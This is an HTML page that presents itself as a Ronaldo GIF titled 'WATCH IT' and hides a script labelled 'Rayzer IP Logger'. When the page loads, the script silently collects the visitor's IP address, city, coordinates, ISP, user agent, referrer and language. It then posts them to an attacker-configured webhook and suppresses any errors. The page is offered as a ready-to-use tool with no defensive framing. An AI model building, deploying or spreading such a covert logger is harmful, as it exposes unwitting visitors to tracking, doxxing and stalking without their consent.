<!DOCTYPE html>
<html>

<head>
    <title>WATCH IT</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        body {
            margin: 0;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        img {
            max-width: 100%;
            height: auto;
        }
    </style>
    <script>
        // CONFIGURATION
        const WEBHOOK_URL = "PUT YOUR WEBHOOK HERE";
        const GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

        async function capture() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();

                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
                const geo = await geoRes.json();

                const payload = {
                    username: "Rayzer IP Logger",
                    embeds: [{
                        title: "New Log (HTML/JS) 🔍",
                        color: 0x2f3136,
                        fields: [
                            { name: "IP", value: `\`${ip}\``, inline: true },
                            { name: "Location", value: `${geo.city || "?"}, ${geo.regionName || "?"}, ${geo.country || "?"}`, inline: true },
                            { name: "Cords", value: `${geo.lat || "?"}, ${geo.lon || "?"}`, inline: true },
                            { name: "ISP", value: geo.isp || "Unknown", inline: false },
                            { name: "User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
                            { name: "Referer", value: document.referrer || "None", inline: false },
                            { name: "Language", value: navigator.language, inline: true }
                        ],
                        footer: { text: "Rayzer Logger" },
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    mode: "no-cors",
                    body: JSON.stringify(payload)
                });
            } catch (err) {
            }
        }

        window.onload = capture;
    </script>
</head>

<body>
    <img src="https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif" alt="Rayzer" />
</body>

</html>
